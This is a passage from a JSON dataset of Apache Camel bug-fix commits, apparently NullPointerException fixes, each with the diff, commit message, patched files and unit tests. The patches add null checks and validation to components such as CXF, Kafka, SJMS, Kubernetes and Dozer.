                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/testbean/CustomerService.java?ref=e0d3edd94940d29403076d098d53595be6480214",
                "deletions": 2,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/testbean/CustomerService.java",
                "patch": "@@ -21,7 +21,6 @@\n import java.util.Map;\n import java.util.concurrent.ConcurrentHashMap;\n import java.util.concurrent.atomic.AtomicLong;\n-\n import javax.ws.rs.DELETE;\n import javax.ws.rs.GET;\n import javax.ws.rs.POST;\n@@ -32,7 +31,7 @@\n import javax.ws.rs.QueryParam;\n import javax.ws.rs.core.Response;\n \n-\n+import org.apache.cxf.common.util.StringUtils;\n \n /**\n  *\n@@ -91,6 +90,10 @@ public Response updateCustomer(Customer customer) {\n     @POST\n     @Path(\"/customers/\")\n     public Response addCustomer(Customer customer) {\n+        if (StringUtils.isEmpty(customer.getName())) {\n+            return Response.status(422).build();\n+        }\n+\n         customer.setId(currentId.incrementAndGet());\n \n         customers.put(customer.getId(), customer);",
                "raw_url": "https://github.com/apache/camel/raw/e0d3edd94940d29403076d098d53595be6480214/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/testbean/CustomerService.java",
                "sha": "c0519486977a4916dabad74548dad7bbe8c8f525",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9230: CXFRS NPE when response code not in Response.Status. Thanks to Ron Ten-Hove for the patch.",
        "parent": "https://github.com/apache/camel/commit/e7ac45b614564b33f5c5c7f8fb2c156df4f18283",
        "patched_files": [
            "CustomerService.java",
            "CxfRsProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfRsProducerTest.java"
        ]
    },
    "camel_e1d57c3": {
        "bug_id": "camel_e1d57c3",
        "commit": "https://github.com/apache/camel/commit/e1d57c38cc14e7ce508390a619f2e11497238dcc",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/e1d57c38cc14e7ce508390a619f2e11497238dcc/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java?ref=e1d57c38cc14e7ce508390a619f2e11497238dcc",
                "deletions": 1,
                "filename": "components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java",
                "patch": "@@ -53,7 +53,7 @@ protected RabbitMQEndpoint createEndpoint(String uri,\n \n         if (LOG.isDebugEnabled()) {\n             LOG.debug(\"Creating RabbitMQEndpoint with host {}:{} and exchangeName: {}\",\n-                    endpoint.getHostname(), endpoint.getPortNumber(), endpoint.getExchangeName())\n+                    new Object[]{endpoint.getHostname(), endpoint.getPortNumber(), endpoint.getExchangeName()});\n         }\n \n         return endpoint;",
                "raw_url": "https://github.com/apache/camel/raw/e1d57c38cc14e7ce508390a619f2e11497238dcc/components/camel-rabbitmq/src/main/java/org/apache/camel/component/rabbitmq/RabbitMQComponent.java",
                "sha": "f8dbd8594479ac42165f614c7703958f81540fff",
                "status": "modified"
            }
        ],
        "message": "Fixed NPE in rabbitmq and polished the component.",
        "parent": "https://github.com/apache/camel/commit/3d15766435d90cc1b3c1805b10ea713400a06b8b",
        "patched_files": [
            "RabbitMQComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RabbitMQComponentTest.java"
        ]
    },
    "camel_e1d6386": {
        "bug_id": "camel_e1d6386",
        "commit": "https://github.com/apache/camel/commit/e1d63867a6fcde0de0dd197a3e546554957ce372",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/e1d63867a6fcde0de0dd197a3e546554957ce372/camel-core/src/main/java/org/apache/camel/model/cloud/ServiceCallDefinition.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/cloud/ServiceCallDefinition.java?ref=e1d63867a6fcde0de0dd197a3e546554957ce372",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/model/cloud/ServiceCallDefinition.java",
                "patch": "@@ -28,7 +28,6 @@\n import javax.xml.bind.annotation.XmlTransient;\n \n import org.apache.camel.CamelContext;\n-import org.apache.camel.CamelContextAware;\n import org.apache.camel.ExchangePattern;\n import org.apache.camel.Expression;\n import org.apache.camel.Processor;\n@@ -782,9 +781,11 @@ public Processor createProcessor(RouteContext routeContext) throws Exception {\n         final ServiceChooser serviceChooser = retrieveServiceChooser(camelContext);\n         final ServiceLoadBalancer loadBalancer = retrieveLoadBalancer(camelContext);\n \n-        if (loadBalancer instanceof CamelContextAware) {\n-            ((CamelContextAware) loadBalancer).setCamelContext(camelContext);\n-        }\n+        ObjectHelper.trySetCamelContext(serviceDiscovery, camelContext);\n+        ObjectHelper.trySetCamelContext(serviceFilter, camelContext);\n+        ObjectHelper.trySetCamelContext(serviceChooser, camelContext);\n+        ObjectHelper.trySetCamelContext(loadBalancer, camelContext);\n+\n         if (loadBalancer instanceof ServiceDiscoveryAware) {\n             ((ServiceDiscoveryAware) loadBalancer).setServiceDiscovery(serviceDiscovery);\n         }",
                "raw_url": "https://github.com/apache/camel/raw/e1d63867a6fcde0de0dd197a3e546554957ce372/camel-core/src/main/java/org/apache/camel/model/cloud/ServiceCallDefinition.java",
                "sha": "539deb5d5c3b7b04161b032731c3a0e1f34b5b5d",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/e1d63867a6fcde0de0dd197a3e546554957ce372/components/camel-kubernetes/src/main/java/org/apache/camel/component/kubernetes/cloud/KubernetesEnvServiceDiscovery.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-kubernetes/src/main/java/org/apache/camel/component/kubernetes/cloud/KubernetesEnvServiceDiscovery.java?ref=e1d63867a6fcde0de0dd197a3e546554957ce372",
                "deletions": 0,
                "filename": "components/camel-kubernetes/src/main/java/org/apache/camel/component/kubernetes/cloud/KubernetesEnvServiceDiscovery.java",
                "patch": "@@ -40,6 +40,8 @@ public KubernetesEnvServiceDiscovery(KubernetesConfiguration configuration) {\n             final int port = ctx.getTypeConverter().tryConvertTo(int.class, num);\n \n             return Collections.singletonList(new DefaultServiceDefinition(name, host, port));\n+        } catch (IllegalArgumentException e) {\n+            return Collections.emptyList();\n         } catch (Exception e) {\n             throw new RuntimeCamelException(e);\n         }",
                "raw_url": "https://github.com/apache/camel/raw/e1d63867a6fcde0de0dd197a3e546554957ce372/components/camel-kubernetes/src/main/java/org/apache/camel/component/kubernetes/cloud/KubernetesEnvServiceDiscovery.java",
                "sha": "4e62f0a0ed7af105c97a4ba03c526bb1f9c75984",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/e1d63867a6fcde0de0dd197a3e546554957ce372/components/camel-kubernetes/src/test/java/org/apache/camel/component/kubernetes/cloud/ServiceCallEnvironmentRouteTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-kubernetes/src/test/java/org/apache/camel/component/kubernetes/cloud/ServiceCallEnvironmentRouteTest.java?ref=e1d63867a6fcde0de0dd197a3e546554957ce372",
                "deletions": 1,
                "filename": "components/camel-kubernetes/src/test/java/org/apache/camel/component/kubernetes/cloud/ServiceCallEnvironmentRouteTest.java",
                "patch": "@@ -45,7 +45,7 @@ public void configure() throws Exception {\n                 KubernetesConfiguration kubernetesConfiguration = new KubernetesConfiguration();\n \n                 ServiceCallConfigurationDefinition config = new ServiceCallConfigurationDefinition();\n-                config.setServiceDiscovery(new KubernetesEnvServiceDiscovery(kubernetesConfiguration));\n+                config.kubernetesEnvServiceDiscovery();\n \n                 // register configuration\n                 context.setServiceCallConfiguration(config);",
                "raw_url": "https://github.com/apache/camel/raw/e1d63867a6fcde0de0dd197a3e546554957ce372/components/camel-kubernetes/src/test/java/org/apache/camel/component/kubernetes/cloud/ServiceCallEnvironmentRouteTest.java",
                "sha": "c4ccd517883744a40991f1e5b1e110cb9e0e6e9b",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12561: camel-kubernetes: serviceCall EIP throws NullPointerException",
        "parent": "https://github.com/apache/camel/commit/caa6db3349aee3566b69216ea2c063e3180ee7b2",
        "patched_files": [
            "KubernetesEnvServiceDiscovery.java",
            "ServiceCallDefinition.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ServiceCallEnvironmentRouteTest.java"
        ]
    },
    "camel_e275446": {
        "bug_id": "camel_e275446",
        "commit": "https://github.com/apache/camel/commit/e275446a4768231a76c76e24985b796865550e3b",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java?ref=e275446a4768231a76c76e24985b796865550e3b",
                "deletions": 0,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java",
                "patch": "@@ -105,6 +105,10 @@ public SjmsEndpoint getEndpoint() {\n \n     @Override\n     protected void doStart() throws Exception {\n+        if (getConnectionResource() == null) {\n+            throw new IllegalArgumentException(String.format(\"ConnectionResource or ConnectionFactory must be configured for %s\", this));\n+        }\n+\n         super.doStart();\n         this.executor = getEndpoint().getCamelContext().getExecutorServiceManager().newDefaultThreadPool(this, \"SjmsConsumer\");\n         if (consumers == null) {",
                "raw_url": "https://github.com/apache/camel/raw/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java",
                "sha": "e0c7984c304e6644b00518335b6b3f3326b04659",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsProducer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsProducer.java?ref=e275446a4768231a76c76e24985b796865550e3b",
                "deletions": 0,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsProducer.java",
                "patch": "@@ -84,6 +84,10 @@ public SjmsProducer(Endpoint endpoint) {\n \n     @Override\n     protected void doStart() throws Exception {\n+        if (getConnectionResource() == null) {\n+            throw new IllegalArgumentException(String.format(\"ConnectionResource or ConnectionFactory must be configured for %s\", this));\n+        }\n+\n         super.doStart();\n         this.executor = getEndpoint().getCamelContext().getExecutorServiceManager().newDefaultThreadPool(this, \"SjmsProducer\");\n         if (getProducers() == null) {",
                "raw_url": "https://github.com/apache/camel/raw/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsProducer.java",
                "sha": "91515dbd4b28d013993ea229044af2a92b9ba82b",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java?ref=e275446a4768231a76c76e24985b796865550e3b",
                "deletions": 0,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
                "patch": "@@ -139,10 +139,15 @@ public void destroyObject(MessageConsumerResources model) throws Exception {\n \n     @Override\n     protected void doStart() throws Exception {\n+\n         if (isEndpointTransacted()) {\n             throw new IllegalArgumentException(\"InOut exchange pattern is incompatible with transacted=true as it cuases a deadlock. Please use transacted=false or InOnly exchange pattern.\");\n         }\n \n+        if (getConnectionResource() == null) {\n+            throw new IllegalArgumentException(String.format(\"ConnectionResource or ConnectionFactory must be configured for %s\", this));\n+        }\n+\n         if (ObjectHelper.isEmpty(getNamedReplyTo())) {\n             log.debug(\"No reply to destination is defined.  Using temporary destinations.\");\n         } else {",
                "raw_url": "https://github.com/apache/camel/raw/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
                "sha": "0e4d16b31328c029ef633c35b82237111ff922ad",
                "status": "modified"
            },
            {
                "additions": 133,
                "blob_url": "https://github.com/apache/camel/blob/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/test/java/org/apache/camel/component/sjms/producer/NoConnectionFactoryTest.java",
                "changes": 133,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/test/java/org/apache/camel/component/sjms/producer/NoConnectionFactoryTest.java?ref=e275446a4768231a76c76e24985b796865550e3b",
                "deletions": 0,
                "filename": "components/camel-sjms/src/test/java/org/apache/camel/component/sjms/producer/NoConnectionFactoryTest.java",
                "patch": "@@ -0,0 +1,133 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.sjms.producer;\n+\n+import org.apache.camel.CamelContext;\n+import org.apache.camel.FailedToCreateRouteException;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.impl.DefaultCamelContext;\n+import org.junit.Assert;\n+import org.junit.Test;\n+import org.slf4j.Logger;\n+import org.slf4j.LoggerFactory;\n+\n+/**\n+ * A unit test to ensure getting a meaningful error message\n+ * when neither of ConnectionResource nor ConnectionFactory is configured.\n+ */\n+public class NoConnectionFactoryTest {\n+\n+    private static final Logger LOG = LoggerFactory.getLogger(NoConnectionFactoryTest.class);\n+\n+    @Test\n+    public void testConsumerInOnly() throws Exception {\n+        CamelContext context = new DefaultCamelContext();\n+        context.addRoutes(createConsumerInOnlyRouteBuilder());\n+        try {\n+            context.start();\n+        } catch (Throwable t) {\n+            Assert.assertEquals(IllegalArgumentException.class, t.getClass());\n+            LOG.info(\"Expected exception was thrown\", t);\n+            return;\n+        }\n+        Assert.fail(\"No exception was thrown\");\n+    }\n+\n+    @Test\n+    public void testConsumerInOut() throws Exception {\n+        CamelContext context = new DefaultCamelContext();\n+        context.addRoutes(createConsumerInOutRouteBuilder());\n+        try {\n+            context.start();\n+        } catch (Throwable t) {\n+            Assert.assertEquals(IllegalArgumentException.class, t.getClass());\n+            LOG.info(\"Expected exception was thrown\", t);\n+            return;\n+        }\n+        Assert.fail(\"No exception was thrown\");\n+    }\n+\n+    @Test\n+    public void testProducerInOnly() throws Exception {\n+        CamelContext context = new DefaultCamelContext();\n+        context.addRoutes(createProducerInOnlyRouteBuilder());\n+        try {\n+            context.start();\n+        } catch (Throwable t) {\n+            Assert.assertEquals(IllegalArgumentException.class, t.getClass());\n+            LOG.info(\"Expected exception was thrown\", t);\n+            return;\n+        }\n+        Assert.fail(\"No exception was thrown\");\n+    }\n+\n+    @Test\n+    public void testProducerInOut() throws Exception {\n+        CamelContext context = new DefaultCamelContext();\n+        context.addRoutes(createProducerInOutRouteBuilder());\n+        try {\n+            context.start();\n+        } catch (Throwable t) {\n+            Assert.assertEquals(IllegalArgumentException.class, t.getClass());\n+            LOG.info(\"Expected exception was thrown\", t);\n+            return;\n+        }\n+        Assert.fail(\"No exception was thrown\");\n+    }\n+\n+    protected RouteBuilder createConsumerInOnlyRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"sjms:queue:test-in?exchangePattern=InOnly\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+    protected RouteBuilder createConsumerInOutRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"sjms:queue:test-in?exchangePattern=InOut\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+    protected RouteBuilder createProducerInOnlyRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:inonly\")\n+                    .to(\"sjms:queue:test-out?exchangePattern=InOnly\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+    protected RouteBuilder createProducerInOutRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:inout\")\n+                    .to(\"sjms:queue:test-out?exchangePattern=InOut\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/e275446a4768231a76c76e24985b796865550e3b/components/camel-sjms/src/test/java/org/apache/camel/component/sjms/producer/NoConnectionFactoryTest.java",
                "sha": "95cde5845ee684e9a53c84b5897b274d8909ec2f",
                "status": "added"
            }
        ],
        "message": "CAMEL-10398 SJMS - Avoid NPE when neither of ConnectionResource nor ConnectionFactory is configured\n\nConflicts:\n\tcomponents/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
        "parent": "https://github.com/apache/camel/commit/d3b0b65f5234ec9cfb08863cb617f9390b6dddbc",
        "patched_files": [
            "SjmsConsumer.java",
            "InOutProducer.java",
            "SjmsProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "NoConnectionFactoryTest.java"
        ]
    },
    "camel_e317e7b": {
        "bug_id": "camel_e317e7b",
        "commit": "https://github.com/apache/camel/commit/e317e7b470f03d14fe51b9efcc6d251e869c8224",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/e317e7b470f03d14fe51b9efcc6d251e869c8224/components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaEndpoint.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaEndpoint.java?ref=e317e7b470f03d14fe51b9efcc6d251e869c8224",
                "deletions": 1,
                "filename": "components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaEndpoint.java",
                "patch": "@@ -89,7 +89,9 @@ public Exchange createKafkaExchange(MessageAndMetadata<byte[], byte[]> mm) {\n         Message message = new DefaultMessage();\n         message.setHeader(KafkaConstants.PARTITION, mm.partition());\n         message.setHeader(KafkaConstants.TOPIC, mm.topic());\n-        message.setHeader(KafkaConstants.KEY, new String(mm.key()));\n+        if (mm.key() != null) {\n+            message.setHeader(KafkaConstants.KEY, new String(mm.key()));\n+        }\n         message.setBody(mm.message());\n         exchange.setIn(message);\n ",
                "raw_url": "https://github.com/apache/camel/raw/e317e7b470f03d14fe51b9efcc6d251e869c8224/components/camel-kafka/src/main/java/org/apache/camel/component/kafka/KafkaEndpoint.java",
                "sha": "002d15e7021152aa454661cc0e953d5dc54b0edb",
                "status": "modified"
            }
        ],
        "message": "[CAMEL-7306]: key is optional. Avoid NPE",
        "parent": "https://github.com/apache/camel/commit/cd8da7d36b008a6f11e5c00715c1906b1a02a87d",
        "patched_files": [
            "KafkaEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "KafkaEndpointTest.java"
        ]
    },
    "camel_e55c71b": {
        "bug_id": "camel_e55c71b",
        "commit": "https://github.com/apache/camel/commit/e55c71bf74d3a9dc31e1a5e58096576c4589a434",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/e55c71bf74d3a9dc31e1a5e58096576c4589a434/camel-core/src/main/java/org/apache/camel/support/TimerListenerManager.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/support/TimerListenerManager.java?ref=e55c71bf74d3a9dc31e1a5e58096576c4589a434",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/support/TimerListenerManager.java",
                "patch": "@@ -111,7 +111,10 @@ protected void doStart() throws Exception {\n     @Override\n     protected void doStop() throws Exception {\n         // executor service will be shutdown by CamelContext\n-        task.cancel(true);\n+        if (task != null) {\n+            task.cancel(true);\n+            task = null;\n+        }\n     }\n \n }",
                "raw_url": "https://github.com/apache/camel/raw/e55c71bf74d3a9dc31e1a5e58096576c4589a434/camel-core/src/main/java/org/apache/camel/support/TimerListenerManager.java",
                "sha": "f583b9acfb06e6b5bad2fb2a9caa26ef85bbeb3f",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in doStop\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1232309 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/45b70e23a4ce3fce52a7fc802f1bc0abdc52eb41",
        "patched_files": [
            "TimerListenerManager.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "TimerListenerManagerTest.java"
        ]
    },
    "camel_e5a1e58": {
        "bug_id": "camel_e5a1e58",
        "commit": "https://github.com/apache/camel/commit/e5a1e585cc8fc9655c7edfac52341ce287a2e725",
        "file": [
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/e5a1e585cc8fc9655c7edfac52341ce287a2e725/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "changes": 24,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java?ref=e5a1e585cc8fc9655c7edfac52341ce287a2e725",
                "deletions": 14,
                "filename": "components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "patch": "@@ -43,7 +43,7 @@ public Object convert(Object existingDestinationFieldValue,\n                           Class<?> destinationClass,\n                           Class<?> sourceClass) {\n         try {\n-            return mapCustom(sourceFieldValue);\n+            return mapCustom(sourceFieldValue, sourceClass);\n         } finally {\n             done();\n         }\n@@ -72,11 +72,7 @@ private Object invokeFunction(Method method,\n         return method.invoke(customObj, methodPrms);\n     }\n \n-    Object mapCustom(Object source) {\n-        if (source == null) {\n-            return null;\n-        }\n-\n+    Object mapCustom(Object source, Class<?> sourceClass) {\n         // The converter parameter is stored in a thread local variable, so\n         // we need to parse the parameter on each invocation\n         // ex: custom-converter-param=\"org.example.MyMapping,map\"\n@@ -116,11 +112,11 @@ Object mapCustom(Object source) {\n \n             // If a specific mapping operation has been supplied use that\n             if (operation != null && prmTypesAndValues != null) {\n-                method = selectMethod(customClass, operation, source, prmTypesAndValues);\n+                method = selectMethod(customClass, operation, sourceClass, prmTypesAndValues);\n             } else if (operation != null) {\n-                method = customClass.getMethod(operation, source.getClass());\n+                method = customClass.getMethod(operation, sourceClass);\n             } else {\n-                method = selectMethod(customClass, source);\n+                method = selectMethod(customClass, sourceClass);\n             }\n         } catch (Exception e) {\n             throw new RuntimeException(\"Failed to load custom function\", e);\n@@ -172,12 +168,12 @@ private boolean parametersMatchParameterList(Class<?>[] prmTypes,\n     }\n \n     Method selectMethod(Class<?> customClass,\n-                        Object source) {\n+                        Class<?> sourceClass) {\n         Method method = null;\n         for (Method m : customClass.getDeclaredMethods()) {\n             if (m.getReturnType() != null\n                     && m.getParameterTypes().length == 1\n-                    && m.getParameterTypes()[0].isAssignableFrom(source.getClass())) {\n+                    && m.getParameterTypes()[0].isAssignableFrom(sourceClass)) {\n                 method = m;\n                 break;\n             }\n@@ -189,7 +185,7 @@ Method selectMethod(Class<?> customClass,\n     // ambiguous calls based upon number and types of parameters\n     private Method selectMethod(Class<?> customClass,\n                                 String operation,\n-                                Object source,\n+                                Class<?> sourceClass,\n                                 String[][] parameters) {\n         // Create list of potential methods\n         List<Method> methods = new ArrayList<>();\n@@ -203,7 +199,7 @@ private Method selectMethod(Class<?> customClass,\n             Class<?>[] prmTypes = method.getParameterTypes();\n             if (!method.getName().equals(operation)\n                     || method.getReturnType() == null\n-                    || !prmTypes[0].isAssignableFrom(source.getClass())) {\n+                    || !prmTypes[0].isAssignableFrom(sourceClass)) {\n                 iter.remove();\n                 continue;\n             }\n@@ -230,4 +226,4 @@ private Method selectMethod(Class<?> customClass,\n \n         return methods.size() > 0 ? methods.get(0) : null;\n     }\n-}\n\\ No newline at end of file\n+}",
                "raw_url": "https://github.com/apache/camel/raw/e5a1e585cc8fc9655c7edfac52341ce287a2e725/components/camel-dozer/src/main/java/org/apache/camel/component/dozer/CustomMapper.java",
                "sha": "ded1c7a365ca54e2bd5bd0d06cfd5d2cd78f322d",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/e5a1e585cc8fc9655c7edfac52341ce287a2e725/components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperParametersTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperParametersTest.java?ref=e5a1e585cc8fc9655c7edfac52341ce287a2e725",
                "deletions": 2,
                "filename": "components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperParametersTest.java",
                "patch": "@@ -33,14 +33,14 @@ public void setup() {\n     @Test\n     public void shouldExecuteCustomFunctionWithArguments() throws Exception {\n         customMapper.setParameter(MapperWithMultiParmMethod.class.getName() + \",test,java.lang.Integer=12,java.lang.Integer=20\");\n-        Object result = customMapper.mapCustom(\"JeremiahWasABullfrog\");\n+        Object result = customMapper.mapCustom(\"JeremiahWasABullfrog\", String.class);\n         Assert.assertEquals(\"Bullfrog\", result);\n     }\n \n     @Test\n     public void shouldExecuteCustomFunctionWithVariableArguments() throws Exception {\n         customMapper.setParameter(MapperWithMultiParmMethod.class.getName() + \",add,java.lang.Integer=12,java.lang.Integer=20\");\n-        Object result = customMapper.mapCustom(\"JeremiahWasABullfrog\");\n+        Object result = customMapper.mapCustom(\"JeremiahWasABullfrog\", String.class);\n         Assert.assertEquals(32L, result);\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/e5a1e585cc8fc9655c7edfac52341ce287a2e725/components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperParametersTest.java",
                "sha": "24fc8b5ddab8915192d6eaaccb966b9daa18da20",
                "status": "modified"
            },
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/e5a1e585cc8fc9655c7edfac52341ce287a2e725/components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperTest.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperTest.java?ref=e5a1e585cc8fc9655c7edfac52341ce287a2e725",
                "deletions": 5,
                "filename": "components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperTest.java",
                "patch": "@@ -35,12 +35,12 @@ public void setup() {\n     @Test\n     public void selectMapperOneMethod() {\n         customMapper.setParameter(MapperWithOneMethod.class.getName());\n-        Assert.assertNotNull(customMapper.selectMethod(MapperWithOneMethod.class, \"test\"));\n+        Assert.assertNotNull(customMapper.selectMethod(MapperWithOneMethod.class, String.class));\n     }\n     \n     @Test\n     public void selectMapperMultipleMethods() throws Exception {\n-        Method selectedMethod = customMapper.selectMethod(MapperWithTwoMethods.class, new B());\n+        Method selectedMethod = customMapper.selectMethod(MapperWithTwoMethods.class, B.class);\n         Assert.assertNotNull(selectedMethod);\n         Assert.assertEquals(\n                 MapperWithTwoMethods.class.getMethod(\"convertToA\", B.class),\n@@ -50,25 +50,31 @@ public void selectMapperMultipleMethods() throws Exception {\n     @Test\n     public void mapCustomFindOperation() throws Exception {\n         customMapper.setParameter(MapperWithTwoMethods.class.getName());\n-        Assert.assertNotNull(customMapper.mapCustom(new B()));\n+        Assert.assertNotNull(customMapper.mapCustom(new B(), B.class));\n     }\n     \n     @Test\n     public void mapCustomDeclaredOperation() throws Exception {\n         customMapper.setParameter(MapperWithTwoMethods.class.getName() + \",convertToA\");\n-        Assert.assertNotNull(customMapper.mapCustom(new B()));\n+        Assert.assertNotNull(customMapper.mapCustom(new B(), B.class));\n     }\n     \n     @Test\n     public void mapCustomInvalidOperation() {\n         customMapper.setParameter(MapperWithTwoMethods.class.getName() + \",convertToB\");\n         try {\n-            customMapper.mapCustom(new B());\n+            customMapper.mapCustom(new B(), B.class);\n             Assert.fail(\"Invalid operation should result in exception\");\n         } catch (RuntimeException ex) {\n             Assert.assertTrue(ex.getCause() instanceof NoSuchMethodException);\n         }\n     }\n+\n+    @Test\n+    public void mapCustomNullField() throws Exception {\n+        customMapper.setParameter(MapperWithTwoMethods.class.getName());\n+        Assert.assertNotNull(customMapper.mapCustom(null, B.class));\n+    }\n }\n \n class A {",
                "raw_url": "https://github.com/apache/camel/raw/e5a1e585cc8fc9655c7edfac52341ce287a2e725/components/camel-dozer/src/test/java/org/apache/camel/component/dozer/CustomMapperTest.java",
                "sha": "c7e327111d3850abccea12a77437eb7fd2b62c4d",
                "status": "modified"
            }
        ],
        "message": "CAMEL-9710 Use sourceClass instead of source.getClass() to prevent NPE",
        "parent": "https://github.com/apache/camel/commit/337a6756480354afea7531a1a4216de9d232f211",
        "patched_files": [
            "CustomMapper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CustomMapperParametersTest.java",
            "CustomMapperTest.java"
        ]
    },
